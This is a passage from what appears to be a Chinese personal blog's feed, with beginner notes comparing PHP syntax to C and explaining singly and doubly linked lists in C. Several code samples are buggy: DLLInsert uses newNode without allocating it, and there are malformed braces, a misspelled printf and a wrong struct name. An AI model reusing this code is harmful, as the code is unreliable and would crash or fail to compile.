class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$tireqty</span>).<span class="string">&#x27;tires&lt;br /&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这样做也可以获得可视化结果，且更加安全。如果你现在在浏览器中载入这个脚本，正常来说就可以看到回显的内容。</p><img src="https://cdn.jsdelivr.net/gh/Adam8en/blogImage/images/20230922101925.png" style="zoom:50%;" /><p>然而如果你真的这么做了而且和我一样都是小白，那么你大概率看到的不是正常的结果，而是PHP文件的源代码……</p><p><img src="https://cdn.jsdelivr.net/gh/Adam8en/blogImage/images/20230922102017.png"></p><p>因为你没有给自己的主机配置服务器，从而网页不知道该如何去解析PHP代码。至于如何去配置服务器……抱歉，你这个问题我还真不知道lol。</p><h3 id="变量和字面量"><a href="#变量和字面量" class="headerlink" title="变量和字面量"></a>变量和字面量</h3><p>经历过一些不愉快的小插曲后，我们再次回到例题本身。有关<code>echo htmlspecialchars($tireqty).&#39;tires&lt;br /&gt;&#39;;</code>这一行代码本身，关于（.）的字符串连接符我们已经讲过，而后面所跟的单引号却又是另一个重点。</p><p>在PHP中，双引号和单引号存在区别。其实这一点在C语言中也有类似的情况，在C中单引号常量被视为字符常量，哪怕单引号中包含的字符不止一个；而双引号下的常量则被解释为字符串，末尾默认有一个’\0’占位符存在。而在PHP中，使用双引号会被认为是字符串，此时PHP会解析双引号中的变量，而单引号则会被纯粹的当做是一个字面量，换句话说PHP会直接输出变量名而不会对其进行解析。</p><p>例如下面这一串代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$web_url</span>=<span class="string">&#x27;adam8en.github.io&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$web_url</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$web_url&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以预见到的是，用双引号包裹的变量将会echo出变量的值，而下面的单引号变量则只会打印出变量名。</p><p>在日常使用中，单引号的运行速度比双引号更快，因为单引号不需要经过解析步骤。</p><h3 id="声明和使用常量"><a href="#声明和使用常量" class="headerlink" title="声明和使用常量"></a>声明和使用常量</h3><p>上面我们介绍了如何定义和给变量赋值，那么我们要如何定义常量呢？</p><p>在C语言中，我们一般使用<code>#define</code>定义常量。比如：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BIRTHDAY 77</span></span><br></pre></td></tr></table></figure><p>在实际编程中，我们就可以用常量’BIRTHDAY’来代替整数77。</p><p>在PHP中，我们仍然需要使用define去定义常量，但是使用方式有所不同，具体形式如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">define(<span class="string">&#x27;BIRTHDAY&#x27;</span>,<span class="number">77</span>);</span><br></pre></td></tr></table></figure><p>这时我们就定义了一个新常量。</p><p>除了我们自己定义的常量外，PHP还自己定义了许多常量，我们可以用函数phpinfo()来查看。</p><p>注意函数phpinfo()，今后在安全方面我们还会遇到它。</p><h2 id="就到这里"><a href="#就到这里" class="headerlink" title="就到这里"></a>就到这里</h2><p>好了，通过表单这个例子我们阐述了大部分PHP语言不同于C语言的新特性，接下来我会快速介绍一些PHP和C语言类似的语法知识点，并简单的指出他们之间的细微不同（如果有的话），一些我认为不重要的知识点可能会被我略过（比如转换变量类型的函数），现在让我们快起来吧。</p><h3 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h3><p>和C语言类似，分为局部作用域、全局作用域、静态作用域、本地作用域，唯一不同的超级全局作用域在前文中已经有过具体介绍。</p><h3 id="使用操作符"><a href="#使用操作符" class="headerlink" title="使用操作符"></a>使用操作符</h3><p>PHP也可以直接使用四则运算符合取余符号来对变量进行操作。如果对字符串使用操作符，PHP会尝试把字符串转化为数字。比如把带‘e’或‘E’的字符串视为使用了科学计数法，并将其转化为相应的浮点数。除此之外，PHP还会在字符串开头处寻找数字作为字符串的值，否则把字符串视为0。（C语言会直接报错）</p><h4 id="字符串操作符"><a href="#字符串操作符" class="headerlink" title="字符串操作符"></a>字符串操作符</h4><p>PHP可以直接实现字符串的加法，通过连接符（.）来实现。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$fname</span>=<span class="string">&quot;Adam&quot;</span>;</span><br><span class="line"><span class="variable">$lname</span>=<span class="string">&quot;Ben&quot;</span>;</span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$fname</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$lname</span>;</span><br><span class="line"><span class="comment">//别问我为什么没有遵循XML风格，好麻烦</span></span><br></pre></td></tr></table></figure><h4 id="递减和递增操作符"><a href="#递减和递增操作符" class="headerlink" title="递减和递增操作符"></a>递减和递增操作符</h4><p>PHP允许使用诸如<code>++</code>的形式去递增变量的值，和C相同。</p><h4 id="引用操作符"><a href="#引用操作符" class="headerlink" title="引用操作符"></a>引用操作符</h4><p>PHP可以通过“&amp;”来引用变量的值。它的用法和效果类似于C语言的指针，但是它实际上并不是指针，只是一个别名。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="number">5</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$a</span>;<span class="comment">//b等于5，相当于生成了一个a的副本</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">7</span>；<span class="comment">//此时b仍为5</span></span><br><span class="line"><span class="comment">/**********************/</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">5</span>;</span><br><span class="line"><span class="variable">$b</span>=&amp;<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="number">7</span>;<span class="comment">//此时b也为7</span></span><br></pre></td></tr></table></figure><p>如果想要破坏掉变量之间的引用关系，使用unset()函数重置。</p><h4 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a>比较操作符</h4><p>除了<code>==</code>等于操作符外，PHP还有<code>===</code>恒等操作符。区别在于前者只判断数值是否相等，而后者要求类型也要一致。</p><p>比如0和’0’，在<code>==</code>下是相等的，而<code>===</code>是不等的。因为前者是整数，后者是字符串。</p><h4 id="逻辑操作符"><a href="#逻辑操作符" class="headerlink" title="逻辑操作符"></a>逻辑操作符</h4><p>除了和C相同的<code>&amp;&amp; || !</code>操作符外，PHP还支持类Python的<code>and or</code>逻辑操作符，但是优先级比前面的略低。PHP还支持<code>xor</code>异或操作符。</p><h4 id="位操作符"><a href="#位操作符" class="headerlink" title="位操作符"></a>位操作符</h4><p>这一部分PHP和C完全相同。</p><h4 id="其他操作符"><a href="#其他操作符" class="headerlink" title="其他操作符"></a>其他操作符</h4><p>操作符<code>new</code>和<code>-&gt;</code>分别用来初始化类的实例和访问类的成员。看起来有点像C++的分配内存符和C的访问结构指针变量操作符。</p><p>PHP和C都支持三元操作符<code>condition ? value if true : value if false</code>。</p><h3 id="错误抑制符"><a href="#错误抑制符" class="headerlink" title="错误抑制符"></a>错误抑制符</h3><p>错误抑制符<code>@</code>可以对任何表达式使用，它将抑制可能产生的警告而使程序不中断运行。例如：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=@(<span class="number">50</span>/<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="执行操作符"><a href="#执行操作符" class="headerlink" title="执行操作符"></a>执行操作符</h3><p>执行操作符是一对反向双引号``，它的作用是把反双引号中间的内容当成服务器端的命令来执行。比如在windows端：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$out</span>=`dir c:`;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="variable">$out</span>.<span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这串代码会得到一个目录列表保存在out中，然后在浏览器上显示。</p><h3 id="数组操作符"><a href="#数组操作符" class="headerlink" title="数组操作符"></a>数组操作符</h3><p>PHP也支持用[]访问数组元素，除此之外还有其他操作符。比如可以用+来连接两个数组。</p><h3 id="类型操作符"><a href="#类型操作符" class="headerlink" title="类型操作符"></a>类型操作符</h3><p>PHP只有一个类型操作符instanceof，用于判断一个对象是否是指定的类。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>剩下的诸如if、while、for、switch1等代码块均与C规则相同，不一一介绍了。唯一注意的地方是除了使用C经典的花括号控制结构外，还可以使用PHP特色的控制方法。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>==<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">//C风格</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;TEST&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*这两种方法是等价的*/</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>==<span class="number">0</span>) :</span><br><span class="line"><span class="comment">//PHP风格</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;TEST&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"><span class="keyword">endif</span>;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这一章我们快速的入门了PHP的知识，如果你已经有过C语言的基础，相信这个过程并不难。</p><p>再学一点PHP，直到能入门MySQL为止（勿忘初心）。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300411.jpg" alt="300411"></p>]]></content>
    
    
    <summary type="html">关于PHP的学习笔记</summary>
    
    
    
    <category term="PHP学习" scheme="http://example.com/categories/PHP%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>数据结构什锦（二）——链表篇</title>
    <link href="http://example.com/2023/09/20/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%80%E9%94%A6%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E9%93%BE%E8%A1%A8%E7%AF%87/"/>
    <id>http://example.com/2023/09/20/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%80%E9%94%A6%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E9%93%BE%E8%A1%A8%E7%AF%87/</id>
    <published>2023-09-20T07:49:55.000Z</published>
    <updated>2023-10-25T12:45:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>我们继续讲链表……(‘-ωก̀ )</p><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><p>链表是一种用来储存元素集合的数据结构，它具有以下特性：</p><ul><li>节点由两部分组成，我称之为数据域和指针域，数据域存放你想通过链表储存的数据，而指针域存放指针</li><li>元素通过指针依次相连，即通过指针来指向其他元素</li><li>最后一个元素的指针为空（NULL）</li><li>在执行过程中，链表的长度可以自由伸缩</li><li>链表的长度可以是要求的任意长度，除非系统内存耗尽</li><li>它不会浪费内存空间（相对于开辟数组来说），但是需要额外的空间存放指针。</li></ul><h3 id="链表的抽象数据类型-ADT"><a href="#链表的抽象数据类型-ADT" class="headerlink" title="链表的抽象数据类型&#x2F;ADT"></a>链表的抽象数据类型&#x2F;ADT</h3><p>主要的操作：</p><ul><li>插入（Insert）：将一个元素插入链表中</li><li>删除（Delete）：删除并返回链表中指定位置上的元素</li></ul><p>辅助的操作：</p><ul><li>撤销链表（Delete List）：删除链表中的所有元素</li><li>计数（Count）：返回链表的元素个数（即链表长度）</li><li>查找（Search)：从链表的表尾开始查找第n个节点</li></ul><h3 id="为什么需要链表？"><a href="#为什么需要链表？" class="headerlink" title="为什么需要链表？"></a>为什么需要链表？</h3><p>在学习链表之前，我们一般使用数组来储存数据集合，那么，为什么我们需要链表呢？</p><p>我们首先来回顾一下数组。</p><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>数组是指一片连续的内存块被分配给用户以储存数组元素，即数组是在内存中占据一组连续地址的储存单元。通过输入数组的下标，我们可以快速的访问数组中的任何元素。其时间复杂度为常数O(1)。</p><p>为了访问数组元素，元素的储存地址通常以相对其起始地址的偏移量计算得到，而这个计算需要通过一个乘法运算，即根据数据类型确定一个元素的大小乘以其被访问元素的下标以得到其偏移量，最后将偏移量与起始地址相加。整个过程包括一个乘法计算和加法计算，故数组的访问只需要一个常数时间即可完成。</p><h5 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h5><ul><li>简单、易使用。直接声明即可创建数组</li><li>访问元素速度快</li></ul><h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5><ul><li>固定大小：数组是静态的，在使用数组前就需要给它分配一个固定的大小</li><li>占据一个连续的储存空间，有时候可能无法获得一个足够大的连续内存去储存创建的数组</li><li>复杂的定位插入运算：在数组中插入或删除元素的操作十分麻烦，需要把在插入位置后的所有元素都向后移动一位，最坏的结果时间复杂度达到了O(n)。</li></ul><h4 id="链表的优势"><a href="#链表的优势" class="headerlink" title="链表的优势"></a>链表的优势</h4><p>链表的最大优势是在常数时间内实现扩张。如果使用数组，有时候会出现内存不够的情况，这个时候你可以一开始分配一个内存很大的数组，但是如果你没有把数组全部塞满就会造成内存的浪费。所以这时候我们引入链表，我们首先为一个元素分配储存空间，然后轻松添加新元素。</p><h4 id="链表的缺点"><a href="#链表的缺点" class="headerlink" title="链表的缺点"></a>链表的缺点</h4><p>链表的主要缺点是单个元素的访问时间。</p><p>数组具有随机性，可以实现随机访问，访问每个数组元素所花费的时间相同。但是链表只能实现顺序访问，最坏的情况下访问链表中一个元素要花费O(n)的时间。尽管动态分配的储存分配是链表的一个强大优势，但与此伴随的是<strong>高储存开销</strong>。</p><p>最后链表还需要额外储存指针参数，浪费了储存空间。</p><h3 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h3><p>我们常说的链表是指<strong>单链表</strong>。单链表包括一组节点，一个头节点和一个指向NULL的尾节点，每个节点有一个数据域和指针域。</p><p>下面我们声明一个简单的整形链表。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="链表的基本操作"><a href="#链表的基本操作" class="headerlink" title="链表的基本操作"></a>链表的基本操作</h4><p>主要有：</p><ul><li>遍历链表</li><li>在链表中插入一个元素</li><li>在链表中删除一个元素</li></ul><p>下面我们来依次介绍对应的操作要怎么实现。</p><h5 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h5><p>遍历涉及的操作很简单，我不多介绍了。遍历的作用主要就是用来计算数组长度或者依次显示数据，进而可以用来查找特定的节点。当遍历的节点指向的下一个节点为NULL时，遍历结束。</p><p>以下是代码的实现。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ListLength</span><span class="params">(<span class="keyword">struct</span> ListNode*head)</span>&#123;</span><br><span class="line">    <span class="comment">//这里新定义了一个指针指向头节点，是为了不改变头节点的值，相当于拷贝了一份头节点的副本</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>*<span class="title">current</span>=</span>head;</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(current!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        count++;</span><br><span class="line">        current=current-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>扫描大小为n的列表，时间复杂度是O(n)。只创建了两个临时变量，空间复杂度为O(1)。</p><h5 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h5><p>对于单链表的插入有三种情况。</p><ul><li>在链表首元节点前插入一个新节点</li><li>在链表尾元节点后插入一个新节点</li><li>在链表中间部分插入一个新节点</li></ul><h6 id="在头部插入节点"><a href="#在头部插入节点" class="headerlink" title="在头部插入节点"></a>在头部插入节点</h6><p>这时只需要更新一个节点的指针域，即申请一个新节点并修改其指针域指向原头结点，然后更新头指针指向新首元节点皆可以了。</p><h6 id="在尾部插入节点"><a href="#在尾部插入节点" class="headerlink" title="在尾部插入节点"></a>在尾部插入节点</h6><p>这个时候我们需要修改两个节点的指针域。</p><p>首先申请一个新节点，将其指针域的指针修改为NULL，然后修改原尾元节点使其指针指向新节点即可。</p><p>假如给定了我们一个想要插入节点的位置，我们仍然只需要修改两个指针的指针域。</p><ul><li>如果我们想要在第3个节点前插入新节点，那么我们首先要找到第2个节点。这意味着我们需要遍历两个节点后才能进行插入操作。为了便于描述，我们将第2个节点称为位置节点。新节点的指针域指向位置节点的下一个节点（即目标节点）</li><li>首先创建一个新节点，使新创立的节点指针域指向目标节点。</li><li>然后修改位置节点的指针域，使其指向新节点，这样我们便完成了中间节点的插入。</li></ul><p>下面我们根据以上三种情况编写代码。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> InsertInLinkedList&#123;<span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>**<span class="title">head</span>, <span class="title">int</span> <span class="title">data</span>, <span class="title">int</span> <span class="title">position</span>&#125;&#123;</span></span><br><span class="line">    <span class="comment">//这里用到了指针的指针，是为了更改头指针指向的节点</span></span><br><span class="line">    <span class="type">int</span> k=<span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>*<span class="title">p</span>,*<span class="title">q</span>,*<span class="title">newNode</span>;</span></span><br><span class="line">    newNode=(ListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line">    <span class="keyword">if</span>(!newNode)&#123;</span><br><span class="line">        <span class="comment">//如果新节点申请失败则报错，检查合法性，增强健壮性</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Memory Error!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    newNode-&gt;data=data;</span><br><span class="line">    p=*head;<span class="comment">//p设置为头指针</span></span><br><span class="line">    <span class="comment">//在头部插入节点</span></span><br><span class="line">    <span class="keyword">if</span>(position==<span class="number">1</span>)&#123;</span><br><span class="line">        newNode-&gt;next=p;</span><br><span class="line">        *head=newNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//遍历链表直到达到我们想要插入的位置为止</span></span><br><span class="line">        <span class="keyword">while</span>((p!=<span class="literal">NULL</span>)&amp;&amp;(k&lt;position))&#123;</span><br><span class="line">            k++;</span><br><span class="line">            q=p;</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        q-&gt;next=newNode;<span class="comment">//这里有更好的方法实现这一点</span></span><br><span class="line">        newNode-&gt;next=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，我们也可以根据三种不同的情况实现三种不同的函数。</p><h5 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h5><p>与插入类似，链表的删除也有三种情况。</p><ul><li>删除首元节点</li><li>删除尾元节点</li><li>删除中间部分的一个节点</li></ul><p>现在我们三种情况来讨论。</p><h6 id="删除头节点"><a href="#删除头节点" class="headerlink" title="删除头节点"></a>删除头节点</h6><p>删除头节点一共需要两步。</p><ul><li>创建一个临时变量指向要删除的头节点。</li><li>修改头指针指向下一个节点，然后撤销临时指针变量指向的首元节点（free操作）。</li></ul><h6 id="删除尾节点"><a href="#删除尾节点" class="headerlink" title="删除尾节点"></a>删除尾节点</h6><p>同样的，我们删除尾节点时需要找到它的前驱节点。其实现分为三步。</p><ul><li>遍历列表找到前驱节点地址。我们需要两个指针变量指向尾元节点和尾元节点的直接前驱节点。</li><li>更新前驱节点的指针域，将其置为NULL。</li><li>撤销尾节点。</li></ul><h6 id="删除中间节点"><a href="#删除中间节点" class="headerlink" title="删除中间节点"></a>删除中间节点</h6><p>删除中间节点和前面的步骤类似，具体体现为更新前驱节点的指针域为待删除节点所指向的下一个节点，其余步骤相同。</p><p>现在我们用代码来实现删除节点。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DeleteNodeFromLinkedList</span><span class="params">(<span class="keyword">struct</span> LinkNode**head, <span class="type">int</span> position)</span>&#123;</span><br><span class="line">    <span class="type">int</span> k=<span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>*<span class="title">p</span>,*<span class="title">q</span>;</span></span><br><span class="line">    <span class="keyword">if</span>(*head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//检查链表是否为空链表，此时仅一个节点</span></span><br><span class="line">        print(<span class="string">&quot;List Empty&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    p=*head;</span><br><span class="line">    <span class="comment">//删除首元节点</span></span><br><span class="line">    <span class="keyword">if</span>(position==<span class="number">1</span>)&#123;</span><br><span class="line">        *head=(*head)-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//遍历链表直到找到我们要删除的节点为止</span></span><br><span class="line">        <span class="keyword">while</span> ((p!=<span class="literal">NULL</span>)&amp;&amp;(k&lt;position))&#123;</span><br><span class="line">            k++;</span><br><span class="line">            q=p;</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="comment">//到达表尾</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Position does not exist.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//被删除的元素位于表中</span></span><br><span class="line">            q-&gt;next=p-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上算法的时间复杂度为O(n)，空间复杂度为O(1)。</p><p>以上是单链表的介绍。</p><h4 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h4><p>双链表是指指针域上包含两个分别指向左右两边的前后驱节点指针的链表。相比单链表，双链表拥有更多优势。我们只需要得到双链表的一个节点，就可以访问整条链表上的所有元素。比如在单链表中得到一个节点，我们无法删除这个单个节点，因为这需要单节点的前驱节点才可以操作。而双链表则不然，我们可以通过元素的左指针找到它的直接前驱。</p><p>双链表也存在不足，主要体现在：</p><ul><li>每个节点都要求增加一个指针域，即需要更多的空间资源。</li><li>插入和删除节点需要花费的时间更长（因为新增了一个另一个方向的指针）</li></ul><p>除此之外，双链表的操作基本和单链表类似。如果掌握了单链表的操作，双链表也不是什么难事。</p><p>下面我们来创建一个简单的双链表模板。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DLLNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DLLNode</span>*<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DLLNode</span>*<span class="title">prev</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="双链表的插入"><a href="#双链表的插入" class="headerlink" title="双链表的插入"></a>双链表的插入</h5><p>双链表的插入操作与单链表一样可分为三种，即在头部、尾部和中间分别插入新节点。</p><h6 id="在头部插入节点-1"><a href="#在头部插入节点-1" class="headerlink" title="在头部插入节点"></a>在头部插入节点</h6><p>双链表插入的步骤与单链表大致相同，唯一不同的地方就是此时多了一个左指针。我们也可以将插入步骤分为两步。</p><ul><li>申请一个新节点，把新节点的左指针置为NULL，右指针指向原头结点。</li><li>修改原首元节点使其左指针指向新节点，并把头指针指向新节点即可。</li></ul><h6 id="在尾部插入节点-1"><a href="#在尾部插入节点-1" class="headerlink" title="在尾部插入节点"></a>在尾部插入节点</h6><p>同上，也可分为两个步骤。</p><ul><li>申请新节点并遍历至链表尾元节点，修改新节点的左指针指向原尾元节点，右指针置为NULL。</li><li>修改原尾节点的右指针指向新节点即可。</li></ul><h6 id="在中间插入节点"><a href="#在中间插入节点" class="headerlink" title="在中间插入节点"></a>在中间插入节点</h6><p>在中间插入节点可能有些复杂，因为要涉及到三个节点和四个指针，这里我们举例来说明更好理解。</p><p>假设有中间相邻节点a和b，现在要在b节点前插入p节点，伪代码示例如下。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p.prev=a;<span class="comment">//设置p的左右节点指向a，b</span></span><br><span class="line">p.next=b;</span><br><span class="line"></span><br><span class="line">a.next.prev=p;<span class="comment">//设置b的左指针指向p</span></span><br><span class="line">b.prev.next=p;<span class="comment">//设置a的右指针指向p</span></span><br></pre></td></tr></table></figure><p>现在我们来编写代码来实现这三种情况的插入。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DLLInsert</span><span class="params">(<span class="keyword">struct</span> DLLNode**head, <span class="type">int</span> data, <span class="type">int</span> position)</span>&#123;</span><br><span class="line">    <span class="type">int</span> k=<span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DLLNode</span>*<span class="title">temp</span>,*<span class="title">newNode</span>;</span><span class="comment">//这里多了一个临时变量</span></span><br><span class="line">    <span class="keyword">if</span>(!newNode)&#123;</span><br><span class="line">        <span class="comment">//如果内存判断错误就退出</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Memory Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    newNode-&gt;data=data;<span class="comment">//装填数据</span></span><br><span class="line">    <span class="keyword">if</span>(position==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">//在头部插入节点</span></span><br><span class="line">        newNode-&gt;prev=<span class="literal">NULL</span>;</span><br><span class="line">        newNode-&gt;next=*head;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(*head)</span><br><span class="line">            (*head)-&gt;prev=newNode;<span class="comment">//如果头节点存在，增强健壮性</span></span><br><span class="line">        </span><br><span class="line">        *head=newNode;<span class="comment">//修改头指针指向新节点</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    temp=*head;</span><br><span class="line">    <span class="keyword">while</span>((k&lt;position<span class="number">-1</span>)&amp;&amp;temp-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//这里没有使用else语句，因为如果触发了if判断将在if块内就进行返回</span></span><br><span class="line">        <span class="comment">//所以没有必要再加else</span></span><br><span class="line">        <span class="comment">//这里遍历到了要操作的节点，注意这里循环结束的条件是position-1</span></span><br><span class="line">        temp=temp-&gt;next;</span><br><span class="line">        k++;<span class="comment">//k为位置节点序号</span></span><br><span class="line">        <span class="comment">//此时temp即为待操作元素</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(k!=position<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Desired position does not exist.\n&quot;</span>);</span><br><span class="line">    &#125;<span class="comment">//如果在k到达position-1之前就退出循环，说明已经遍历到了表尾，所以不存在</span></span><br><span class="line">    newNode-&gt;next=temp-&gt;next;<span class="comment">//</span></span><br><span class="line">    newNode-&gt;prev=temp;</span><br><span class="line">    <span class="keyword">if</span> (temp-&gt;next)</span><br><span class="line">        <span class="comment">//如果temp的右指针不为空，也就是不是尾节点的话</span></span><br><span class="line">        temp-&gt;next-&gt;prev=newNode;</span><br><span class="line">    </span><br><span class="line">    temp-&gt;next=newNode;<span class="comment">//实际上是在temp及其后驱节点间插入了元素</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="双链表的删除"><a href="#双链表的删除" class="headerlink" title="双链表的删除"></a>双链表的删除</h5><p>删除的操作也分为三种情况：</p><ul><li>删除头节点</li><li>删除尾节点</li><li>删除中间节点</li></ul><h6 id="在头部删除节点"><a href="#在头部删除节点" class="headerlink" title="在头部删除节点"></a>在头部删除节点</h6><p>删除头部节点，我们主要分为两步。</p><ul><li>创建一个临时声明的指针变量，指向当前头节点。</li><li>然后使头节点指针向后移动一位，并置头节点的左指针域为空，最后撤销临时变量指向的节点。</li></ul><h6 id="在尾部删除节点"><a href="#在尾部删除节点" class="headerlink" 